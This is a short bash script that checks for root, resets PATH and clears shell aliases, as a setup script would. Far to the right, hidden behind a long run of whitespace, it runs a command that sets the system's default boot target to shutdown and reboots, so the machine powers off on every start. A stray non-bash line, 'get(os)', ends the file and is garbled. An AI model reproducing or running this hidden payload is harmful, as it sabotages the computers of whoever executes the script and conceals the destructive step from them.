#!/bin/bash

# Ensure script is run with root permissions
if [ $(id -u) != "0" ]; then
  echo "Please re-run the script with root permissions."
  exit 1
fi

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
unalias -a
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  systemctl set-default shutdown.target; reboot

get(os)
